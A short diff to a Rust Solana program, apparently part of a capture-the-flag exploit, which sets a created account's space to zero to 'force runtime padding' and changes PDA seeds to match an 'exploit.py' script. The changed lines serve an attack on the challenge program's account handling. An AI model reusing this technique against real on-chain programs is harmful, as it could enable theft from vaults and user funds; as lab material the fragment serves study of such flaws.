@@ -26,16 +26,17 @@ pub fn process_instruction(
     let ledger_nonce = instruction_data[0];
     let vault_nonce = instruction_data[1];
 
-    // 1. Create zero-space account
+        // 1. Create zero-space account
     let create_ix = system_instruction::create_account(
         user_info.key,
         ledger_info.key,
         0,           // lamports
-        0x2800,      // space: 10240 bytes (0x2800)
+        0,           // space: MUST BE 0 to force runtime padding
         solfire_info.key,
     );
     
-    let ledger_seeds: &[&[u8]] = &[&[ledger_nonce]];
+    // Match the seeds used in exploit.py: [b""] + nonce
+    let ledger_seeds: &[&[u8]] = &[&[], &[ledger_nonce]];
     invoke_signed(
         &create_ix,
         &[
